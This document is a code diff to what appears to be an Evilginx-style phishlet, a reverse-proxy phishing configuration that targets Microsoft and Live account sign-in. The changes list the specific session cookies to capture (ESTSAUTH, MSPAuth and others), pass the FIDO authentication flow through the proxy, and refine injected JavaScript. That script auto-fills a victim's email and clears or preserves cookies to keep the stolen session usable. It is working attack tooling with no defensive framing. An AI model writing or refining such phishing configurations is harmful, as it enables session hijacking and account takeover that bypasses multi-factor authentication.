@@ -83,21 +83,21 @@ sub_filters:
 auth_tokens:
   # Core Microsoft domains
   - domain: '.login.microsoftonline.com'
-    keys: ['.*,regexp']
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie', 'buid', 'x-ms-gateway-slice', 'stsservicecookie', 'AADSSO', 'KMSI', 'contextid', '.*,regexp']
   - domain: 'login.microsoftonline.com'
-    keys: ['.*,regexp']
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie', 'buid', 'x-ms-gateway-slice', 'stsservicecookie', 'AADSSO', 'KMSI', 'contextid', '.*,regexp']
   - domain: '.login.microsoft.com'
-    keys: ['.*,regexp']
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie', 'buid', 'x-ms-gateway-slice', 'stsservicecookie', 'AADSSO', 'KMSI', 'contextid', '.*,regexp']
   - domain: 'login.microsoft.com'
-    keys: ['.*,regexp']
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie', 'buid', 'x-ms-gateway-slice', 'stsservicecookie', 'AADSSO', 'KMSI', 'contextid', '.*,regexp']
   - domain: '.microsoft.com'
     keys: ['.*,regexp']
   - domain: '.live.com'
-    keys: ['.*,regexp']
+    keys: ['MSPAuth', 'MSPProf', 'MSPSoft', 'MSPOK', 'MC0', 'MC1', 'MS0', 'NAP', 'PPAuth', 'MH', 'ANON', 'MSA', 'OParams', 'contextid', '.*,regexp']
   - domain: '.login.live.com'
-    keys: ['.*,regexp']
+    keys: ['MSPAuth', 'MSPProf', 'MSPSoft', 'MSPOK', 'MC0', 'MC1', 'MS0', 'NAP', 'PPAuth', 'MH', 'ANON', 'MSA', 'OParams', 'contextid', '.*,regexp']
   - domain: 'login.live.com'
-    keys: ['.*,regexp']
+    keys: ['MSPAuth', 'MSPProf', 'MSPSoft', 'MSPOK', 'MC0', 'MC1', 'MS0', 'NAP', 'PPAuth', 'MH', 'ANON', 'MSA', 'OParams', 'contextid', '.*,regexp']
   - domain: 'outlook.live.com'
     keys: ['.*,regexp']
   - domain: '.office.com'
@@ -136,6 +136,12 @@ force_post:
       - { key: "prompt", search: ".*" }
     force:
       - { key: "prompt", value: "login" }
+    type: "post"
+  # CRITICAL: Preserve contextid for FIDO authentication flow
+  - path: "/consumers/fido/*"
+    search:
+      - { key: "contextid", search: ".*" }
+    force: []
     type: "post"
 
 auth_urls:
@@ -221,7 +227,7 @@ js_inject:
         }
         
         // Fallback to original logic
-        if (emailId != null) {
+        if (emailId != null && data2) {
           var decodedString = data2;
           if (/^[A-Za-z0-9+/=]+$/.test(data2)) {
             try {
@@ -232,8 +238,10 @@ js_inject:
           }
           emailId.focus();
           emailId.value = decodedString;
-          nextButton.focus();
-          nextButton.click();
+          if (nextButton) {
+            nextButton.focus();
+            nextButton.click();
+          }
           console.log("YES!");
           return;
         }
@@ -241,19 +249,36 @@ js_inject:
         setTimeout(function(){autoGrabEmail();}, 500);
       }
       
-      // Cookie cleanup to prevent auto-redirect from existing Microsoft sessions
+      // MODIFIED: Only cleanup cookies if this is a FRESH login attempt (no credentials submitted yet)
       function cleanupExistingSessions() {
-        // Clear ESTSAUTH cookies that cause auto-redirect
-        var cookiesToClear = ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie', 'ESTSUSERLIST'];
-        cookiesToClear.forEach(function(name) {
-          document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.microsoftonline.com';
-          document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.live.com';
-          document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.microsoft.com';
-        });
+        // Check if we're on the actual login page (not a redirect/callback)
+        var isLoginPage = window.location.pathname.includes('/oauth2/') || 
+                         window.location.pathname === '/' ||
+                         window.location.pathname.includes('/consumers/');
+        
+        // Check if user has already submitted credentials (presence of password field or KMSI page)
+        var passwordField = document.querySelector('input[name="passwd"]') || document.querySelector('input[type="password"]');
+        var kmsiCheckbox = document.querySelector('input[name="kmsi"]') || document.querySelector('input[name="DontShowAgain"]');
+        var hasSubmittedCreds = passwordField !== null || kmsiCheckbox !== null;
+        
+        // Only clear cookies if this is initial login page AND no credentials submitted yet
+        if (isLoginPage && !hasSubmittedCreds) {
+          // Clear ESTSAUTH cookies that cause auto-redirect
+          var cookiesToClear = ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie'];
+          cookiesToClear.forEach(function(name) {
+            document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.microsoftonline.com';
+            document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.live.com';
+            document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.microsoft.com';
+          });
+          console.log('[Phishlet] Cleared existing session cookies');
+        } else {
+          console.log('[Phishlet] Preserving session - credentials flow active');
+        }
       }
       
-      // Run cleanup on page load
+      // Run cleanup on page load (will detect context automatically)
       cleanupExistingSessions();
       
       // Start autograb after cleanup
       setTimeout(function(){autoGrabEmail();}, 500);
+
